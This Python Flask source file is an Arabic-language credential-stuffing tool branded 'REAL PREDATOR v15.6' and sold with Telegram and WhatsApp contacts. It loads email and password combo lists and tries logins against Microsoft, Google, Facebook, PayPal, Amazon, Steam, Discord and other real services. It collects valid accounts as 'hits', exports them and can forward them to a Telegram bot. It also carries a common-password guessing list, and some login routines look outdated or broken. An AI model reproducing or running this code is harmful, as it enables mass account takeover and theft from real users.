# ================================================================
# REAL PREDATOR v15.6 - ULTIMATE EDITION (Auto-Platform Detection)
# Developer: ZERO STORE
# Telegram: @MRDPY
# ================================================================

import os
import re
import time
import random
import threading
import requests
import json
import base64
from datetime import datetime
from flask import Flask, render_template_string, jsonify, request, send_file
from flask_cors import CORS
import urllib3

urllib3.disable_warnings()

app = Flask(__name__)
app.secret_key = os.urandom(32)
CORS(app)

DEVELOPER = "ZERO STORE"
DEV_TELEGRAM = "@MRDPY"
WHATSAPP = "249907118667"
WHATSAPP_LINK = f"https://wa.me/{WHATSAPP}"

# ================================================================
# منصات إضافية قابلة للاختراق
# ================================================================
PLATFORMS = [
    {'name': 'Hotmail/Outlook', 'icon': 'fa-solid fa-envelope', 'color': '#0078D4', 'check': 'microsoft', 'gaming': False},
    {'name': 'Google', 'icon': 'fa-brands fa-google', 'color': '#ea4335', 'check': 'google', 'gaming': False},
    {'name': 'Facebook', 'icon': 'fa-brands fa-facebook', 'color': '#1877f2', 'check': 'facebook', 'gaming': False},
    {'name': 'Instagram', 'icon': 'fa-brands fa-instagram', 'color': '#e4405f', 'check': 'instagram', 'gaming': False},
    {'name': 'Twitter/X', 'icon': 'fa-brands fa-twitter', 'color': '#1da1f2', 'check': 'twitter', 'gaming': False},
    {'name': 'TikTok', 'icon': 'fa-brands fa-tiktok', 'color': '#00f2ea', 'check': 'tiktok', 'gaming': False},
    {'name': 'Spotify', 'icon': 'fa-brands fa-spotify', 'color': '#1db954', 'check': 'spotify', 'gaming': False},
    {'name': 'Netflix', 'icon': 'fa-solid fa-film', 'color': '#e50914', 'check': 'netflix', 'gaming': False},
    {'name': 'Amazon', 'icon': 'fa-brands fa-amazon', 'color': '#ff9900', 'check': 'amazon', 'gaming': False},
    {'name': 'PayPal', 'icon': 'fa-brands fa-paypal', 'color': '#003087', 'check': 'paypal', 'gaming': False},
    {'name': 'Steam', 'icon': 'fa-brands fa-steam', 'color': '#171a21', 'check': 'steam', 'gaming': True},
    {'name': 'Discord', 'icon': 'fa-brands fa-discord', 'color': '#5865f2', 'check': 'discord', 'gaming': True},
    {'name': 'Ubisoft', 'icon': 'fa-solid fa-gamepad', 'color': '#1a1a2e', 'check': 'ubisoft', 'gaming': True},
    {'name': 'EA Sports', 'icon': 'fa-solid fa-gamepad', 'color': '#ff0000', 'check': 'ea', 'gaming': True},
    {'name': 'Epic Games', 'icon': 'fa-solid fa-gamepad', 'color': '#2a2a2a', 'check': 'epic', 'gaming': True},
    {'name': 'Roblox', 'icon': 'fa-solid fa-cube', 'color': '#00b4d8', 'check': 'roblox', 'gaming': True},
    {'name': 'Snapchat', 'icon': 'fa-brands fa-snapchat', 'color': '#fffc00', 'check': 'snapchat', 'gaming': False},
    {'name': 'Reddit', 'icon': 'fa-brands fa-reddit', 'color': '#ff4500', 'check': 'reddit', 'gaming': False},
]

# ================================================================
# قاموس النطاقات للمنصات (للكشف التلقائي)
# ================================================================
DOMAIN_PLATFORM_MAP = {
    # Microsoft
    'outlook.com': 'microsoft', 'hotmail.com': 'microsoft', 'live.com': 'microsoft', 'msn.com': 'microsoft',
    # Google
    'gmail.com': 'google', 'googlemail.com': 'google',
    # Facebook
    'facebook.com': 'facebook',
    # Instagram
    'instagram.com': 'instagram',
    # Twitter
    'twitter.com': 'twitter', 'x.com': 'twitter',
    # TikTok
    'tiktok.com': 'tiktok',
    # Spotify
    'spotify.com': 'spotify',
    # Netflix
    'netflix.com': 'netflix',
    # Amazon
    'amazon.com': 'amazon', 'amazon.co.uk': 'amazon', 'amazon.de': 'amazon',
    # PayPal
    'paypal.com': 'paypal',
    # Steam
    'steampowered.com': 'steam', 'steam.com': 'steam',
    # Discord
    'discord.com': 'discord', 'discordapp.com': 'discord',
    # Ubisoft
    'ubisoft.com': 'ubisoft',
    # EA
    'ea.com': 'ea',
    # Epic Games
    'epicgames.com': 'epic',
    # Roblox
    'roblox.com': 'roblox',
    # Snapchat
    'snapchat.com': 'snapchat',
    # Reddit
    'reddit.com': 'reddit',
}

# ================================================================
# كلمات سر شائعة للتوليد
# ================================================================
COMMON_PASSWORDS = [
    '123456', 'password', '123456789', '12345', '12345678', 'qwerty',
    'abc123', 'password1', '123123', '111111', 'iloveyou', 'admin',
    'welcome', 'monkey', 'letmein', 'dragon', 'master', 'sunshine',
    'princess', '1234', 'passw0rd', 'shadow', 'superman', 'michael',
    'ashley', 'jordan', 'charlie', 'thomas', 'london', 'liverpool',
    'chelsea', 'arsenal', 'manchester', 'barcelona', 'god', 'diamond',
    'phoenix', 'freedom', 'justice', 'lovely', 'jessica', 'samantha',
    'daniel', 'robert', 'james', 'william', 'richard', 'david',
    'joseph', 'thomas', 'charles', 'matthew', 'anthony', 'mark',
    'steven', 'andrew', 'paul', 'joshua', 'kenneth', 'kevin',
    'brian', 'george', 'timothy', 'ronald', 'edward', 'jason',
    'jeffrey', 'ryan', 'jacob', 'gary', 'nicholas', 'eric',
    'jonathan', 'stephen', 'larry', 'justin', 'scott', 'brandon',
    'benjamin', 'samuel', 'raymond', 'gregory', 'frank', 'alexander',
    'patrick', 'jack', 'dennis', 'jerry', 'tyler', 'aaron',
    'jose', 'nathan', 'adam', 'henry', 'zachary', 'taylor',
    'andrea', 'morgan', 'secret', 'love', 'baby', 'angel',
    'hunter', 'cookie', 'pepper', 'summer', 'winter', 'spring',
    'autumn', 'flower', 'dream', 'star', 'moon', 'sun',
    'sky', 'ocean', 'forest', 'thunder', 'lightning'
]

# ================================================================
# حالة التشغيل
# ================================================================
class PredatorState:
    def __init__(self):
        self.running = False
        self.checked = 0
        self.total = 0
        self.hits = 0
        self.bad = 0
        self.errors = 0
        self.start_time = None
        self.feed = []
        self.results = []
        self.gaming_results = []
        self.lock = threading.Lock()
        self.feed_lock = threading.Lock()
        self.speed = 30
        self.combo_list = []  # كل عنصر: (email, password, platform_check)
        self.bot_token = ""
        self.chat_id = ""
        self.telegram_enabled = False
        self.generated = 0
        self.platform_stats = {}

state = PredatorState()

# ================================================================
# دالة الكشف التلقائي عن المنصة من البريد الإلكتروني
# ================================================================
def detect_platform(email):
    """
    تستخرج النطاق من البريد الإلكتروني وتعيد اسم المنصة (check)
    """
    try:
        domain = email.split('@')[1].lower()
        # إزالة subdomains غير ضرورية
        domain_parts = domain.split('.')
        if len(domain_parts) >= 2:
            # جرب النطاق الكامل أولاً
            full_domain = '.'.join(domain_parts[-2:])
            # ثم جرب النطاق كاملاً
            if domain in DOMAIN_PLATFORM_MAP:
                return DOMAIN_PLATFORM_MAP[domain]
            if full_domain in DOMAIN_PLATFORM_MAP:
                return DOMAIN_PLATFORM_MAP[full_domain]
            # جرب النطاق مع subdomain كامل
            for known_domain in DOMAIN_PLATFORM_MAP:
                if domain.endswith(known_domain) or full_domain == known_domain:
                    return DOMAIN_PLATFORM_MAP[known_domain]
    except:
        pass
    return None

# ================================================================
# HTML TEMPLATE (نفس الشكل السابق)
# ================================================================
HTML_TEMPLATE = '''
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>REAL PREDATOR v15.6</title>
<link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Share+Tech+Mono&display=swap" rel="stylesheet">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#050508;color:#00ff41;font-family:'Share Tech Mono',monospace;min-height:100vh}
::-webkit-scrollbar{width:3px}
::-webkit-scrollbar-track{background:#111}
::-webkit-scrollbar-thumb{background:#00ff41}
@keyframes pulse{0%,100%{box-shadow:0 0 20px rgba(0,255,65,0.3)}50%{box-shadow:0 0 60px rgba(0,255,65,0.6)}}
@keyframes slideIn{from{opacity:0;transform:translateX(-20px)}to{opacity:1;transform:translateX(0)}}
.header{background:rgba(0,0,0,0.95);border-bottom:2px solid #00ff41;padding:10px 20px;display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap}
.header h1{font-size:20px;font-family:'Orbitron',monospace;color:#00ff41}
.header h1 span{color:#ff0044}
.header .dev{color:#00ff41;font-size:12px}
.container{max-width:1500px;margin:0 auto;padding:10px}
.stats-grid{display:grid;grid-template-columns:repeat(8,1fr);gap:4px;margin-bottom:8px}
.stat-box{background:rgba(0,0,0,0.8);border:1px solid rgba(0,255,65,0.06);border-radius:4px;padding:5px;text-align:center}
.stat-box .num{font-size:18px;font-weight:700;display:block}
.stat-box .label{font-size:7px;color:#006622}
.stat-box.green .num{color:#00ff41}
.stat-box.red .num{color:#ff0044}
.stat-box.gold .num{color:#ffd700}
.stat-box.blue .num{color:#0088ff}
.card{background:rgba(0,0,0,0.85);border:1px solid rgba(0,255,65,0.06);border-radius:6px;padding:8px 12px;margin-bottom:6px}
.card-title{font-size:11px;color:#00cc33;margin-bottom:4px}
.progress-bar{height:2px;background:rgba(0,255,65,0.05);border-radius:1px;overflow:hidden}
.progress-bar .fill{height:100%;background:#ff0044;width:0%}
.progress-text{font-size:8px;color:#006622;display:flex;justify-content:space-between;margin-top:2px}
.btn{padding:4px 12px;border-radius:4px;font-size:9px;font-weight:700;background:transparent;cursor:pointer;transition:all 0.3s;font-family:'Share Tech Mono',monospace}
.btn:disabled{opacity:0.3;cursor:not-allowed}
.btn-start{background:rgba(0,255,65,0.05);border:1px solid #00ff41;color:#00ff41}
.btn-start:hover:not(:disabled){transform:scale(1.05);box-shadow:0 0 50px rgba(0,255,65,0.4)}
.btn-stop{background:rgba(255,0,68,0.1);border-color:#ff0044;color:#ff0044}
.btn-export{background:rgba(255,215,0,0.05);border-color:#ffd700;color:#ffd700}
.btn-clear{border-color:rgba(255,255,255,0.1);color:#006622}
.control-bar{display:flex;gap:4px;flex-wrap:wrap;align-items:center}
.config-row{display:flex;gap:4px;flex-wrap:wrap;align-items:center}
.config-row input,.config-row select{padding:2px 6px;background:rgba(0,0,0,0.8);border:1px solid rgba(0,255,65,0.1);border-radius:4px;color:#00ff41;font-size:9px;font-family:'Share Tech Mono',monospace}
.config-row input:focus{outline:none;border-color:#00ff41}
.config-row label{color:#006622;font-size:8px}
.feed-container{max-height:150px;overflow-y:auto}
.feed-item{padding:1px 6px;font-size:8px;border-left:2px solid transparent;animation:slideIn 0.3s}
.feed-item.hit{background:rgba(0,255,65,0.04);border-left-color:#00ff41}
.feed-item.taken{background:rgba(255,0,68,0.06);border-left-color:#ff0044}
.feed-item.gaming{background:rgba(255,215,0,0.08);border-left-color:#ffd700}
.feed-item .time{color:#006622;font-size:7px;min-width:30px;display:inline-block}
.result-container{max-height:450px;overflow-y:auto}
.result-item{padding:6px 10px;font-size:8px;border-bottom:1px solid rgba(0,255,65,0.05);white-space:pre-wrap;word-break:break-all}
.result-item.gaming{background:rgba(255,215,0,0.05);border:1px solid rgba(255,215,0,0.1)}
.result-item .gaming-badge{display:inline-block;background:rgba(255,215,0,0.15);color:#ffd700;padding:1px 6px;border-radius:3px;font-size:7px;margin-right:4px;border:1px solid rgba(255,215,0,0.2)}
.status-badge{display:inline-flex;align-items:center;gap:4px;padding:2px 8px;border-radius:4px;font-size:9px}
.status-badge.running{background:rgba(255,0,68,0.1);color:#ff0044;border:1px solid #ff0044}
.status-badge.stopped{background:rgba(0,255,65,0.05);color:#00ff41;border:1px solid rgba(0,255,65,0.2)}
.status-dot{width:5px;height:5px;border-radius:50%;display:inline-block}
.status-dot.running{background:#ff0044;animation:pulse 1.5s infinite}
.status-dot.stopped{background:#00ff41}
.empty-state{text-align:center;padding:15px;color:#006622;font-size:9px}
.platform-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(50px,1fr));gap:2px;margin-bottom:6px}
.platform-badge{padding:2px 4px;border-radius:3px;text-align:center;font-size:6px;border:1px solid rgba(0,255,65,0.06);background:rgba(0,0,0,0.6);color:#006622}
.platform-badge .icon{font-size:11px;display:block}
.platform-badge.gaming{border-color:#ffd700;color:#ffd700}
.telegram-box{background:rgba(0,0,0,0.6);border:1px solid rgba(0,255,65,0.05);border-radius:4px;padding:4px 8px;display:flex;gap:6px;flex-wrap:wrap;align-items:center}
.telegram-box input{background:rgba(0,0,0,0.9);border:1px solid rgba(0,255,65,0.1);border-radius:3px;color:#00ff41;padding:3px 8px;font-size:8px;font-family:'Share Tech Mono',monospace;width:130px}
.telegram-box input:focus{outline:none;border-color:#00ff41}
.telegram-box .toggle-label{display:flex;align-items:center;gap:4px;color:#006622;font-size:8px}
.telegram-box .toggle-label input[type="checkbox"]{appearance:none;width:28px;height:14px;background:#222;border-radius:7px;position:relative;cursor:pointer;border:1px solid #333}
.telegram-box .toggle-label input[type="checkbox"]:checked{background:#00ff41}
.telegram-box .toggle-label input[type="checkbox"]::after{content:'';position:absolute;top:1px;left:1px;width:10px;height:10px;background:#000;border-radius:50%;transition:all 0.2s}
.telegram-box .toggle-label input[type="checkbox"]:checked::after{left:15px;background:#000}
.whatsapp-float{position:fixed;bottom:15px;right:15px;z-index:999;animation:pulse 2s infinite}
.whatsapp-float a{display:flex;width:45px;height:45px;background:#25D366;color:#000;border-radius:50%;font-size:22px;text-decoration:none;align-items:center;justify-content:center}
@media(max-width:768px){.stats-grid{grid-template-columns:repeat(4,1fr)}.header h1{font-size:14px}}
</style>
</head>
<body>
<header class="header">
    <h1>REAL <span>PREDATOR</span></h1>
    <div class="dev">{{ developer }} <small>| {{ dev_telegram }}</small></div>
</header>
<div class="container">
    <div class="platform-grid">
        {% for p in platforms %}
        <div class="platform-badge {% if p.gaming %}gaming{% endif %}">
            <span class="icon"><i class="{{ p.icon }}" style="color:{{ p.color }}"></i></span>
            {{ p.name }}
        </div>
        {% endfor %}
    </div>
    <div class="card">
        <div style="display:flex;align-items:center;gap:8px;flex-wrap:wrap;justify-content:space-between;">
            <div style="display:flex;align-items:center;gap:6px;flex-wrap:wrap;">
                <span class="status-badge stopped" id="statusBadge">
                    <span class="status-dot stopped" id="statusDot"></span>
                    <span id="statusText">OFFLINE</span>
                </span>
                <span style="color:#006622;font-size:8px;"><i class="fas fa-clock"></i> <span id="elapsed">00:00:00</span></span>
                <span style="color:#006622;font-size:8px;"><i class="fas fa-tachometer-alt"></i> <span id="cpm">0</span> RPM</span>
            </div>
            <div style="font-size:9px;">
                <span style="color:#00ff41;">🟢 <span id="hitCount">0</span></span>
                <span style="color:#ffd700;margin-right:6px;">🎮 <span id="gamingCount">0</span></span>
                <span style="color:#ff0044;margin-right:6px;">❌ <span id="badCount">0</span></span>
            </div>
        </div>
    </div>
    <div class="stats-grid">
        <div class="stat-box green"><span class="num" id="statChecked">0</span><span class="label">SCANNED</span></div>
        <div class="stat-box gold"><span class="num" id="statHits">0</span><span class="label">HITS</span></div>
        <div class="stat-box red"><span class="num" id="statBad">0</span><span class="label">FAILED</span></div>
        <div class="stat-box blue"><span class="num" id="statErrors">0</span><span class="label">ERRORS</span></div>
        <div class="stat-box gold"><span class="num" id="statGaming">0</span><span class="label">GAMING</span></div>
        <div class="stat-box green"><span class="num" id="statRemaining">0</span><span class="label">REMAINING</span></div>
        <div class="stat-box green"><span class="num" id="statTotal">0</span><span class="label">TOTAL</span></div>
        <div class="stat-box red"><span class="num" id="statSpeed">0</span><span class="label">RPM</span></div>
    </div>
    <div class="card">
        <div class="progress-bar"><div class="fill" id="progressFill"></div></div>
        <div class="progress-text"><span id="progressPct">0%</span><span id="progressCount">0 / 0</span></div>
    </div>
    <div class="card">
        <div class="control-bar">
            <button class="btn btn-start" id="startBtn"><i class="fas fa-play"></i> START</button>
            <button class="btn btn-stop" id="stopBtn" disabled><i class="fas fa-stop"></i> STOP</button>
            <button class="btn btn-clear" id="clearBtn"><i class="fas fa-trash"></i> CLEAR</button>
            <button class="btn btn-export" id="exportBtn"><i class="fas fa-download"></i> EXPORT</button>
            <div class="config-row" style="margin-right:auto;">
                <label>RPM:</label>
                <input type="number" id="speedInput" value="30" min="5" max="60" style="width:45px;">
            </div>
        </div>
        <div style="display:flex;gap:6px;flex-wrap:wrap;margin-top:6px;padding-top:6px;border-top:1px solid rgba(0,255,65,0.05);">
            <div class="telegram-box">
                <i class="fab fa-telegram" style="color:#0088cc;"></i>
                <label style="color:#006622;font-size:8px;">Bot Token:</label>
                <input type="text" id="botTokenInput" placeholder="123456:ABC-DEF">
                <label style="color:#006622;font-size:8px;">Chat ID:</label>
                <input type="text" id="chatIdInput" placeholder="123456789">
                <label class="toggle-label">
                    <span style="font-size:7px;">إرسال</span>
                    <input type="checkbox" id="telegramToggle">
                </label>
                <button class="btn" id="updateTelegramBtn" style="font-size:7px;padding:2px 8px;border:1px solid rgba(0,255,65,0.2);color:#00ff41;">تحديث</button>
            </div>
            <div class="config-row">
                <label><i class="fas fa-upload"></i> Combo:</label>
                <input type="file" id="comboFile" accept=".txt" style="display:none;">
                <label for="comboFile" style="padding:2px 8px;background:rgba(0,0,0,0.8);border:1px solid rgba(0,255,65,0.1);border-radius:4px;cursor:pointer;font-size:8px;">اختر</label>
                <span id="comboName" style="color:#006622;font-size:7px;">لا يوجد ملف</span>
            </div>
        </div>
    </div>
    <div class="card">
        <div class="card-title"><i class="fas fa-broadcast"></i> LIVE FEED <span style="font-size:8px;color:#006622;" id="feedCount">(0)</span></div>
        <div class="feed-container" id="feedContainer"><div class="empty-state"><i class="fas fa-inbox"></i> جاري الصيد...</div></div>
    </div>
    <div class="card">
        <div class="card-title"><i class="fas fa-database" style="color:#ffd700;"></i> VALID ACCOUNTS <span style="font-size:8px;color:#006622;" id="resultCount">(0)</span></div>
        <div class="result-container" id="resultContainer"><div class="empty-state"><i class="fas fa-empty-set"></i> لا توجد حسابات</div></div>
    </div>
</div>
<div class="whatsapp-float"><a href="{{ whatsapp_link }}" target="_blank"><i class="fab fa-whatsapp"></i></a></div>
<script>
const $=id=>document.getElementById(id);
let state={running:false,checked:0,total:1,hits:0,bad:0,errors:0,gaming:0};

async function api(endpoint,method='GET',data=null){
    const opts={method,headers:{'Content-Type':'application/json'}};
    if(data)opts.body=JSON.stringify(data);
    try{const res=await fetch(endpoint,opts);return await res.json();}catch(e){return{success:false};}
}

async function updateStats(){
    try{
        const d=await api('/api/stats');
        if(!d.success)return;
        state.running=d.running;state.checked=d.checked;state.total=d.total||1;
        state.hits=d.hits;state.bad=d.bad;state.errors=d.errors||0;state.gaming=d.gaming||0;
        $('statChecked').textContent=state.checked;
        $('statHits').textContent=state.hits;
        $('statBad').textContent=state.bad;
        $('statErrors').textContent=state.errors;
        $('statGaming').textContent=state.gaming;
        $('statRemaining').textContent=d.remaining||0;
        $('statTotal').textContent=state.total;
        $('statSpeed').textContent=d.cpm||0;
        $('cpm').textContent=d.cpm||0;
        $('hitCount').textContent=state.hits;
        $('gamingCount').textContent=state.gaming;
        $('badCount').textContent=state.bad;
        $('elapsed').textContent=formatTime(d.elapsed||0);
        const pct=state.total>0?Math.min((state.checked/state.total)*100,100):0;
        $('progressFill').style.width=pct+'%';
        $('progressPct').textContent=pct.toFixed(1)+'%';
        $('progressCount').textContent=state.checked+' / '+state.total;
        const badge=$('statusBadge'),dot=$('statusDot'),text=$('statusText');
        if(state.running){badge.className='status-badge running';dot.className='status-dot running';text.textContent='HUNTING';}
        else{badge.className='status-badge stopped';dot.className='status-dot stopped';text.textContent='OFFLINE';}
        $('startBtn').disabled=state.running;
        $('stopBtn').disabled=!state.running;
    }catch(e){}
}

function formatTime(sec){const h=String(Math.floor(sec/3600)).padStart(2,'0');const m=String(Math.floor((sec%3600)/60)).padStart(2,'0');const s=String(Math.floor(sec%60)).padStart(2,'0');return h+':'+m+':'+s;}

async function updateFeed(){
    try{
        const d=await api('/api/feed');
        if(!d.success)return;
        const c=$('feedContainer');
        if(!d.feed||d.feed.length===0){c.innerHTML='<div class="empty-state"><i class="fas fa-inbox"></i> جاري الصيد...</div>';return;}
        c.innerHTML=d.feed.slice(0,80).map(item=>{
            const cls=item.type||'info';
            return `<div class="feed-item ${cls}"><span class="time">${item.time||''}</span><span>${item.text||''}</span></div>`;
        }).join('');
        $('feedCount').textContent='('+d.feed.length+')';
    }catch(e){}
}

async function updateResults(){
    try{
        const d=await api('/api/results');
        if(!d.success)return;
        const c=$('resultContainer');
        if(!d.results||d.results.length===0){c.innerHTML='<div class="empty-state"><i class="fas fa-empty-set"></i> لا توجد حسابات</div>';return;}
        c.innerHTML=d.results.map(item=>{
            const gamingClass=item.is_gaming?'gaming':'';
            const badge=item.is_gaming?'<span class="gaming-badge">🎮 GAMING</span>':'';
            return `<div class="result-item ${gamingClass}">${badge}${item.content}</div>`;
        }).join('');
        $('resultCount').textContent='('+d.results.length+')';
    }catch(e){}
}

$('comboFile').addEventListener('change', function(e){
    if(this.files.length>0){
        $('comboName').textContent=this.files[0].name;
        const reader=new FileReader();
        reader.onload=async function(ev){
            await api('/api/upload/combo','POST',{content:ev.target.result});
        };
        reader.readAsText(this.files[0]);
    }
});

$('updateTelegramBtn').addEventListener('click', async function(){
    const token=$('botTokenInput').value.trim();
    const chatId=$('chatIdInput').value.trim();
    const enabled=$('telegramToggle').checked;
    const res=await api('/api/telegram/config','POST',{bot_token:token,chat_id:chatId,enabled:enabled});
    if(res.success){this.innerHTML='✅ تم';setTimeout(()=>{this.innerHTML='تحديث';},2000);}
});

$('startBtn').addEventListener('click',async()=>{
    const speed=parseInt($('speedInput').value)||30;
    const res=await api('/api/start','POST',{speed});
    if(res.success)console.log('STARTED');
});

$('stopBtn').addEventListener('click',async()=>{
    const res=await api('/api/stop','POST');
    if(res.success)console.log('STOPPED');
});

$('clearBtn').addEventListener('click',async()=>{
    if(!confirm('Clear all data?'))return;
    await api('/api/clear','POST');
});

$('exportBtn').addEventListener('click',async()=>{
    const res=await api('/api/export','POST');
    if(res.success)window.open('/api/download/'+res.filename,'_blank');
});

setInterval(updateStats,300);
setInterval(updateFeed,500);
setInterval(updateResults,500);
updateStats();updateFeed();updateResults();
console.log('REAL PREDATOR v15.6 - Auto-Platform Detection');
</script>
</body>
</html>
'''

# ================================================================
# دوال الفحص الدقيق (جميع المنصات) - نفس الكود السابق
# ================================================================

def check_microsoft(email, password, session):
    try:
        url = "https://login.live.com/oauth20_authorize.srf?client_id=00000000402B5328&redirect_uri=https://login.live.com/oauth20_desktop.srf&scope=service::user.auth.xboxlive.com::MBI_SSL&display=touch&response_type=token&locale=en"
        resp = session.get(url, timeout=15)
        ppft = re.search(r'name="PPFT"[^>]*value="([^"]+)"', resp.text, re.I)
        if not ppft: return None, 'bad'
        data = {'login': email, 'loginfmt': email, 'passwd': password, 'PPFT': ppft.group(1), 'type': '11'}
        login = session.post('https://login.live.com/oauth20_authorize.srf', data=data, allow_redirects=True, timeout=15)
        if 'access_token' in login.url or 'success' in login.text.lower():
            return {'success': True, 'platform': 'Microsoft'}, 'hit'
        if 'incorrect' in login.text.lower() or "doesn't exist" in login.text.lower():
            return None, 'bad'
        return None, 'bad'
    except: return None, 'error'

def check_google(email, password, session):
    try:
        url = "https://accounts.google.com/ServiceLogin"
        resp = session.get(url, timeout=15)
        galx = re.search(r'name="GALX"[^>]*value="([^"]+)"', resp.text, re.I)
        if not galx: return None, 'bad'
        data = {'Email': email, 'Passwd': password, 'GALX': galx.group(1), 'signIn': 'Sign in'}
        login = session.post('https://accounts.google.com/ServiceLoginAuth', data=data, allow_redirects=True, timeout=15)
        if 'mail.google.com' in login.url:
            return {'success': True, 'platform': 'Google'}, 'hit'
        if 'incorrect' in login.text.lower():
            return None, 'bad'
        return None, 'bad'
    except: return None, 'error'

def check_facebook(email, password, session):
    try:
        url = "https://www.facebook.com/login.php"
        resp = session.get(url, timeout=15)
        lsd = re.search(r'name="lsd"[^>]*value="([^"]+)"', resp.text, re.I)
        if not lsd: return None, 'bad'
        data = {'email': email, 'pass': password, 'lsd': lsd.group(1), 'login': 'Log In'}
        login = session.post('https://www.facebook.com/login/', data=data, allow_redirects=True, timeout=15)
        if 'home.php' in login.url:
            return {'success': True, 'platform': 'Facebook'}, 'hit'
        if 'incorrect' in login.text.lower():
            return None, 'bad'
        return None, 'bad'
    except: return None, 'error'

def check_instagram(email, password, session):
    try:
        url = "https://www.instagram.com/accounts/login/"
        resp = session.get(url, timeout=15)
        csrf = re.search(r'"csrf_token":"([^"]+)"', resp.text, re.I)
        if not csrf: return None, 'bad'
        headers = {'X-CSRFToken': csrf.group(1), 'X-Requested-With': 'XMLHttpRequest'}
        data = {'username': email, 'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:1735689600:{password}'}
        login = session.post('https://www.instagram.com/accounts/login/ajax/', data=data, headers=headers, timeout=15)
        if '"authenticated":true' in login.text:
            return {'success': True, 'platform': 'Instagram'}, 'hit'
        return None, 'bad'
    except: return None, 'error'

def check_twitter(email, password, session):
    try:
        credentials = f"{email}:{password}"
        encoded = base64.b64encode(credentials.encode()).decode()
        session.headers.update({"Authorization": f"Basic {encoded}"})
        resp = session.get("https://api.twitter.com/1.1/account/verify_credentials.json", timeout=15)
        if resp.status_code == 200 and resp.json().get('id_str'):
            return {'success': True, 'platform': 'Twitter'}, 'hit'
        return None, 'bad'
    except: return None, 'error'

def check_tiktok(email, password, session):
    try:
        url = "https://www.tiktok.com/api/v1/auth/login/"
        data = {"username": email, "password": password}
        resp = session.post(url, json=data, timeout=15)
        if resp.status_code == 200 and "access_token" in resp.text:
            return {'success': True, 'platform': 'TikTok'}, 'hit'
        return None, 'bad'
    except: return None, 'error'

def check_spotify(email, password, session):
    try:
        url = "https://accounts.spotify.com/api/login"
        data = {"username": email, "password": password}
        resp = session.post(url, data=data, timeout=15)
        if "accessToken" in resp.text or "login_success" in resp.text:
            return {'success': True, 'platform': 'Spotify'}, 'hit'
        return None, 'bad'
    except: return None, 'error'

def check_netflix(email, password, session):
    try:
        url = "https://www.netflix.com/login"
        resp = session.get(url, timeout=15)
        auth_url = re.search(r'action="([^"]+)"', resp.text, re.I)
        if not auth_url: return None, 'bad'
        data = {"email": email, "password": password}
        login = session.post(auth_url.group(1), data=data, allow_redirects=True, timeout=15)
        if "browse" in login.url or "profiles" in login.url:
            return {'success': True, 'platform': 'Netflix'}, 'hit'
        return None, 'bad'
    except: return None, 'error'

def check_amazon(email, password, session):
    try:
        url = "https://www.amazon.com/ap/signin"
        resp = session.get(url, timeout=15)
        csrf = re.search(r'name="csrf_token"[^>]*value="([^"]+)"', resp.text, re.I)
        if not csrf: return None, 'bad'
        data = {"email": email, "password": password, "csrf_token": csrf.group(1)}
        login = session.post("https://www.amazon.com/ap/signin", data=data, allow_redirects=True, timeout=15)
        if "your-account" in login.url:
            return {'success': True, 'platform': 'Amazon'}, 'hit'
        return None, 'bad'
    except: return None, 'error'

def check_paypal(email, password, session):
    try:
        url = "https://www.paypal.com/signin"
        resp = session.get(url, timeout=15)
        csrf = re.search(r'name="csrf_token"[^>]*value="([^"]+)"', resp.text, re.I)
        if not csrf: return None, 'bad'
        data = {"login_email": email, "login_password": password, "csrf_token": csrf.group(1)}
        login = session.post("https://www.paypal.com/signin", data=data, allow_redirects=True, timeout=15)
        if "myaccount" in login.url:
            return {'success': True, 'platform': 'PayPal'}, 'hit'
        return None, 'bad'
    except: return None, 'error'

def check_steam(email, password, session):
    try:
        url = "https://store.steampowered.com/login/"
        resp = session.get(url, timeout=15)
        csrf = re.search(r'name="csrf_token"[^>]*value="([^"]+)"', resp.text, re.I)
        if not csrf: return None, 'bad'
        data = {"username": email, "password": password, "csrf_token": csrf.group(1)}
        login = session.post("https://store.steampowered.com/login/dologin/", data=data, timeout=15)
        if '"success":true' in login.text or '"login_complete":true' in login.text:
            return {'success': True, 'platform': 'Steam'}, 'hit'
        return None, 'bad'
    except: return None, 'error'

def check_discord(email, password, session):
    try:
        url = "https://discord.com/api/v9/auth/login"
        data = {"login": email, "password": password}
        resp = session.post(url, json=data, timeout=15)
        if resp.status_code == 200 and "token" in resp.text:
            return {'success': True, 'platform': 'Discord'}, 'hit'
        return None, 'bad'
    except: return None, 'error'

def check_ubisoft(email, password, session):
    try:
        url = "https://public-ubiservices.ubi.com/v3/profiles/sessions"
        data = {"username": email, "password": password}
        resp = session.post(url, json=data, timeout=15)
        if resp.status_code == 200 and "sessionId" in resp.text:
            return {'success': True, 'platform': 'Ubisoft'}, 'hit'
        return None, 'bad'
    except: return None, 'error'

def check_ea(email, password, session):
    try:
        url = "https://accounts.ea.com/connect/auth"
        data = {"username": email, "password": password}
        resp = session.post(url, data=data, timeout=15)
        if "access_token" in resp.text:
            return {'success': True, 'platform': 'EA Sports'}, 'hit'
        return None, 'bad'
    except: return None, 'error'

def check_epic(email, password, session):
    try:
        url = "https://account-public-service-prod.ol.epicgames.com/account/api/oauth/token"
        data = {"grant_type": "password", "username": email, "password": password}
        resp = session.post(url, data=data, timeout=15)
        if resp.status_code == 200 and "access_token" in resp.text:
            return {'success': True, 'platform': 'Epic Games'}, 'hit'
        return None, 'bad'
    except: return None, 'error'

def check_roblox(email, password, session):
    try:
        url = "https://www.roblox.com/login"
        resp = session.get(url, timeout=15)
        csrf = re.search(r'name="__RequestVerificationToken"[^>]*value="([^"]+)"', resp.text, re.I)
        if not csrf: return None, 'bad'
        data = {"username": email, "password": password, "__RequestVerificationToken": csrf.group(1)}
        login = session.post("https://www.roblox.com/authentication/login", data=data, timeout=15)
        if "authentication" in login.text and "success" in login.text:
            return {'success': True, 'platform': 'Roblox'}, 'hit'
        return None, 'bad'
    except: return None, 'error'

def check_snapchat(email, password, session):
    try:
        url = "https://accounts.snapchat.com/accounts/login"
        data = {"username": email, "password": password}
        resp = session.post(url, data=data, timeout=15)
        if "access_token" in resp.text:
            return {'success': True, 'platform': 'Snapchat'}, 'hit'
        return None, 'bad'
    except: return None, 'error'

